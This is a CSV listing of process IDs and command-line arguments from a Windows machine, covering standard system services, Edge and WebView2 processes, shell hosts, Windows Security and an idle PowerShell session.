PID,Args
5452,C:\\WINDOWS\\System32\\svchost.exe -k LocalSystemNetworkRestricted -p -s DsSvc
5544,C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s Appinfo
5668,C:\\WINDOWS\\System32\\svchost.exe -k UnistackSvcGroup
5688,"""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --no-pre-read-main-dll --startup-read-main-dll --metrics-shmem-handle=2144,i,12899569729339981801,6411061428890170723,524288 --field-trial-handle=2316,i,7522029994750082365,3384395441714901132,262144 --variations-seed-version --trace-process-track-uuid=3190708989122997041 --mojo-platform-channel-handle=2608 /prefetch:11"
5728,"""C:\\WINDOWS\\SystemApps\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\CrossDeviceResume.exe"" /tileid MicrosoftWindows.Client.CBS_cw5n1h2txyewy!CrossDeviceResumeApp"
5788,"""C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\143.0.3650.96\\msedgewebview2.exe"" --type=utility --utility-sub-type=network.mojom.NetworkService --lang=en-US --service-sandbox-type=none --noerrdialogs --user-agent=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; Cortana 1.18.9.23723; 10.0.0.0.26100.7462) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.26100 IsWebView2/True (WebView2Version 143.0.3650.96)"" --user-data-dir=""C:\\Users\\administrator\\AppData\\Local\\Packages\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\LocalState\\EBWebView"" --webview-exe-name=SearchHost.exe --webview-exe-version=2125.30600.0.0 --embedded-browser-webview=1 --startup-read-main-dll --metrics-shmem-handle=1964,i,3056541965614802156,14405499626360960067,524288 --field-trial-handle=2016,i,14908420433272789986,11771142321928041056,262144 --enable-features=msEdgeFluentOverlayScrollbar --disable-features=msSmartScreenProtection --variations-seed-version --trace-process-track-uuid=3190708989122997041 --mojo-platform-channel-handle=2264 /prefetch:11 /pfhostedapp:fc3b6dc26ff9858eea25d915469c990c41f4779f"
5796,"""C:\\WINDOWS\\SystemApps\\ShellExperienceHost_cw5n1h2txyewy\\ShellExperienceHost.exe"" -ServerName:App.AppXtk181tbxbce2qsex02s8tw7hfxa9xb3t.mca"
5816,C:\\WINDOWS\\system32\\DllHost.exe /Processid:{973D20D7-562D-44B9-B70B-5A0F49CCDF3F}
5948,C:\\WINDOWS\\System32\\svchost.exe -k netsvcs -p
6096,C:\\WINDOWS\\system32\\svchost.exe -k ClipboardSvcGroup -p -s cbdhsvc
6236,"""C:\\WINDOWS\\SystemApps\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\SearchHost.exe"" -ServerName:CortanaUI.AppXstmwaab17q5s3y22tp6apqz7a45vwv65.mca"
6272,"""C:\\WINDOWS\\SystemApps\\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy\\StartMenuExperienceHost.exe"" -ServerName:FullTrustApp.AppXykjsye98af63ez2annt9djke8trg8stn.mca"
6344,C:\\Windows\\System32\\RuntimeBroker.exe -Embedding
6416,C:\\Windows\\System32\\RuntimeBroker.exe -Embedding
6464,"""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"" --type=utility --utility-sub-type=on_device_model.mojom.OnDeviceModelService --lang=en-US --service-sandbox-type=on_device_model_execution --ram-no-pressure-read-main-dll --metrics-shmem-handle=4728,i,6249706602346698050,12889268632442266975,524288 --field-trial-handle=2316,i,7522029994750082365,3384395441714901132,262144 --variations-seed-version --trace-process-track-uuid=3190708999430457380 --mojo-platform-channel-handle=5148 /prefetch:14"
6476,/silentConfig
6492,"""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"" --type=utility --utility-sub-type=edge_search_indexer.mojom.SearchIndexerInterfaceBroker --lang=en-US --service-sandbox-type=search_indexer --message-loop-type-ui --ram-no-pressure-read-main-dll --metrics-shmem-handle=5072,i,18171689050178243329,13960396100475527721,524288 --field-trial-handle=2316,i,7522029994750082365,3384395441714901132,262144 --variations-seed-version --trace-process-track-uuid=3190709005052708474 --mojo-platform-channel-handle=6804 /prefetch:14"
6500,C:\\WINDOWS\\system32\\svchost.exe -k UdkSvcGroup -s UdkUserSvc
6684,"""C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe"" --type=renderer --pdf-upsell-enabled --dma-cps-flags=2048 --disable-gpu-compositing --video-capture-use-gpu-memory-buffer --lang=en-US --js-flags --device-scale-factor=1.25 --num-raster-threads=1 --renderer-client-id=31 --time-ticks-at-unix-epoch=-1766672747649913 --launch-time-ticks=2807574043 --ram-no-pressure-read-main-dll --metrics-shmem-handle=6976,i,9866675720789805116,4889821369453261617,2097152 --field-trial-handle=2316,i,7522029994750082365,3384395441714901132,262144 --variations-seed-version --trace-process-track-uuid=3190709015360168813 --mojo-platform-channel-handle=6960 /prefetch:1"
6720,/QuitInfo:0000000000000220;0000000000000228; 
6756,-
7144,C:\\Windows\\System32\\oobe\\UserOOBEBroker.exe -Embedding
7156,"""C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\143.0.3650.96\\msedgewebview2.exe"" --embedded-browser-webview=1 --webview-exe-name=SearchHost.exe --webview-exe-version=2125.30600.0.0 --user-data-dir=""C:\\Users\\administrator\\AppData\\Local\\Packages\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\LocalState\\EBWebView"" --noerrdialogs --disable-features=msSmartScreenProtection --edge-webview-enable-mojo-ipcz --enable-features=msEdgeFluentOverlayScrollbar --user-agent=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; Cortana 1.18.9.23723; 10.0.0.0.26100.7462) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.26100 IsWebView2/True (WebView2Version 143.0.3650.96)"" --lang=en-US --mojo-named-platform-channel-pipe=6236.2440.12228863433085657037 /pfhostedapp:fc3b6dc26ff9858eea25d915469c990c41f4779f"
7180,"""C:\\Program Files (x86)\\Microsoft\\EdgeWebView\\Application\\143.0.3650.96\\msedgewebview2.exe"" --type=utility --utility-sub-type=storage.mojom.StorageService --lang=en-US --service-sandbox-type=service --noerrdialogs --user-agent=""Mozilla/5.0 (Windows NT 10.0; Win64; x64; Cortana 1.18.9.23723; 10.0.0.0.26100.7462) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.26100 IsWebView2/True (WebView2Version 143.0.3650.96)"" --user-data-dir=""C:\\Users\\administrator\\AppData\\Local\\Packages\\MicrosoftWindows.Client.CBS_cw5n1h2txyewy\\LocalState\\EBWebView"" --webview-exe-name=SearchHost.exe --webview-exe-version=2125.30600.0.0 --embedded-browser-webview=1 --startup-read-main-dll --metrics-shmem-handle=2276,i,1947266994501167355,12212905891926638892,524288 --field-trial-handle=2016,i,14908420433272789986,11771142321928041056,262144 --enable-features=msEdgeFluentOverlayScrollbar --disable-features=msSmartScreenProtection --variations-seed-version --trace-process-track-uuid=3190708990060038890 --mojo-platform-channel-handle=3532 /prefetch:13 /pfhostedapp:fc3b6dc26ff9858eea25d915469c990c41f4779f"
7276,"""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"" "
7380,C:\\WINDOWS\\system32\\SecurityHealthService.exe
7440,-
7452,"""C:\\Windows\\System32\\SecurityHealthSystray.exe"" "
7472,"""C:\\Program Files\\WindowsApps\\Microsoft.WindowsTerminal_1.23.13503.0_x64__8wekyb3d8bbwe\\OpenConsole.exe"" -Embedding"
